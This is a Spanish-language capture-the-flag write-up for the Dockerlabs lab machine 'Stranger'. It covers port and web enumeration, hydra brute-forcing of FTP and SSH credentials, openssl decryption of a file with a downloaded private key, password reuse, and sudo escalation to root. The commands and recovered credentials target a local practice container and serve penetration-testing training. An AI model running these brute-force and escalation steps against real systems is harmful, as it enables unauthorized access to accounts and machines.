
# Writeup Template: Maquina `[ Stranger ]`

- Tags: #Stranger
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Stranger](https://mega.nz/file/ASUAAAJI#UMnyDI2IGruY4tehy39wKE2lwuKPdfpr_KJZy1l5XN0)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x stranger.zip
sudo bash auto_deploy.sh stranger.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---
## Enumeracion de [Servicio  FTP]
Primero procedemos a enumerar este servicio para detectar posibles fallas de seguridad
Lanzamos un script con **nmap** pero no reporta nada critico:
```bash
nmap --script ftp-anon.nse -p 21 172.17.0.2
```

Lanzamos un script para obtener la version:
```bash
nmap --script banner -p 21 172.17.0.2
```

De primeras no vemos nada critico asi que lanzamos un ataque de fuerza bruta:
```bash
hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -f ftp://172.17.0.2
```

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/strange/             (Status: 200) [Size: 3040]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,pl,html,js
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 231]
/strange              (Status: 301) [Size: 310] [--> http://172.17.0.2/strange/]
```

Tenemos esta url:
```bash
http://172.17.0.2/strange/
```

Ya que no vemos nada que nos de pista de una falla, realizamos **fuzzing** de archivos en esa ruta:
```bash
gobuster dir -u 172.17.0.2/strange/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,pl,html,js
```

**Hallazgos Relevantes:**
```bash
/index.html           (Status: 200) [Size: 3040]
/private.txt          (Status: 200) [Size: 64]
/secret.html          (Status: 200) [Size: 172]
```

Al acceder a esta ruta nos descarga un archivo:
```bash
http://172.17.0.2/strange/private.txt
```

Revisando el tipo de archivo y su contenido tenemos:
```bash
file private.txt
private.txt: data
```

```bash
`O��N�^P����f-�]�^]T��K.Q�a���mgu�3��i���^T���ȉ���P�+F�8^^Q[
```

Revisando esta ruta:
```bash
http://172.17.0.2/strange/secret.html
```

### Credenciales Encontradas
Tenemos credenciales filtradas:
```bash
## The ftp user is admin, but the password is ...

### You must discover it.
#### A hint: The **rockyou** diccionary is correct for use!
```

Ahora que sabemos el nombre del usuario del servicio **ftp** realizamos un ataque de fuerza bruta
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f ftp://172.17.0.2
```

Tenemos las credenciales de acceso para el servicio:
```bash
[21][ftp] host: 172.17.0.2   login: admin   password: banana
```

## Enumeracion de [Servicio  FTP]
Ahora volvemos a enumerar este servicio:
Nos conectamos en el servicio encontrando la siguente llave para despues descargarla:
```bash
ftp> get private_key.pem
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Para desencriptar `private_key.pem` y `private.txt`, sigue esta guía sistemática. La estrategia depende del tipo de encriptación usada:

##### 🔑 1. Para `private_key.pem` (clave privada RSA)
**Normalmente están protegidas con contraseña**.
```bash
openssl pkeyutl --decrypt -in private.txt -out private_text.txt -inkey private_key.pem
```

Tenemos una posible contrasena en el archivo final: **private_text.txt**:
```bash
demogorgon
```

Ahora lanzaremos un ataque de fuerza bruta para encontrar un posible usuario para esta contrasena:
```bash
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p demogorgon -f -t 64 ssh://172.17.0.2
```
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh mwheeler@172.17.0.2 # ( demogorgon )
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"
```

**Hallazgos Clave:**
Tenemos a los usuarios del sistema:
```bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mwheeler:x:1001:1001::/home/mwheeler:/bin/bash
admin:x:1002:1002::/home/admin:/bin/sh
```

### Explotacion de Privilegios

###### Usuario `[ mwheeler ]`:
Probaremos con las credenciales que habiamos obtenido desde el servicio **FTP** para ver si existe reutilizacion de credenciales:
```bash
# Comando para escalar al usuario: ( admin )
su admin # ( banana )
```

###### Usuario `[ mwheeler ]`:
Listando los permisos de este usuario vemos que podemos ejecutar cualquier comando como cualquier usuario:
```bash
User admin may run the following commands on 92374a735991:
    (ALL) ALL
```

Probamos primero que pasa si ejecutamos:
```bash
sudo whoami
```

Nos retoran:
```bash
root
```

Tenemos una via potencial de migrar a root:
```bash
comando para migrar al usuario: ( root )
sudo bash
```

---
## Evidencia de Compromiso
Flag **root**
```bash
root@92374a735991:~# ls
flag.txt

root@92374a735991:~# cat flag.txt 
This is the root flat - Fl@ggR00t -
```

```bash
# Captura de pantalla o output final
root@92374a735991:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a enumerara el servicio **FTP**
2. Aprendimos a realizar ataque por fuerza bruta con **hydra** al servicio **ssh**
3. Aprendimos a abusar de los permisos de los usuarios.

## Recomendaciones de Seguridad
- Evitar dar permisos de ejecutar cualquier comando como cualquier usuario